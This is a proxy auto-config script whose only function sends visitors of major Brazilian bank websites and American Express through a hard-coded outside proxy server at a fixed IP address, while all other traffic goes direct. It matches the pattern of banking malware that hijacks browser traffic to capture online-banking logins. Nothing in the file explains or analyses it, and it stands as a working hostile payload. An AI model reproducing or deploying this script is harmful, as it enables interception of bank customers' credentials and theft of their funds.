function FindProxyForURL(url, host) {
var n = new Array("www.bradesco.com.br","bradesco.com.br", "www.santander.com.br","santander.com.br","www.banespa.com.br","banespa.com.br","www.santanderbanespa.com.br","santanderbanespa.com.br",
"www.real.com.br","real.com.br", "bancoreal.com.br", "www.bancoreal.com.br", "www.itau.com.br", "itau.com.br", "www.bancodobrasil.com.br", "www.bb.com.br", "bancodobrasil.com.br", "bb.com.br", 
"americanexpress.com.br","www.americanexpress.com.br","americanexpress.com","www.americanexpress.com");
for(var i =0;i<n.length;i++) { if (shExpMatch(host, n[i])) {
return "PROXY 98.131.62.152:80"; } }
return "DIRECT"; }